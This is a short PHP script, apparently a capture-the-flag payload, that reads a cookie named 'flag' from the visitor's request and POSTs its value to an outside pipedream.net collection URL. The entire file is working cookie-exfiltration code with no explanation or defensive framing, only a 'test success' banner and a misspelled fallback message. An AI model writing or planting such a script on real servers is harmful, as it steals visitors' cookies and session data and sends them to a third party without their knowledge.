<?php

echo "<h2> test success</h2><br>";

$url = "https://79fe91ba353304d5b6da715d13f68df9.m.pipedream.net";
$cookie_name = "flag";

if(isset($_COOKIE[$cookie_name])) {

    $flag_val = $_COOKIE[$cookie_name];

    $curl = curl_init($url);

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $headers = array(
    "Accept: application/json",
    "Content-Type: application/json",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    $data = "flags={$flag_val}";

    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

    $resp = curl_exec($curl);

    curl_close($curl);
    var_dump($resp);
} else {
    echo "thign not founds";
}
?>